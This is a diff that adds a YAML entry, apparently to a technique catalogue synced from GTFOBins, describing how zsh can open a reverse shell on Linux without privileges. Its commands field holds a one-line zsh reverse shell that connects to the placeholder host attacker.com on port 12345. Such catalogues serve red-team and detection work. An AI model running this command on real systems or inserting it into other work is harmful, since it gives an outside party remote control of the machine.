@@ -1,0 +1,24 @@
+id: gtfobins/zsh/reverse-shell/unprivileged
+type: binary
+platform: linux
+name: zsh
+phases:
+- execution
+- command-and-control
+capabilities:
+- reverse-shell
+privilege_required: user
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+references:
+- https://gtfobins.github.io/gtfobins/zsh/
+tags:
+- linux
+- unix
+- gtfobins
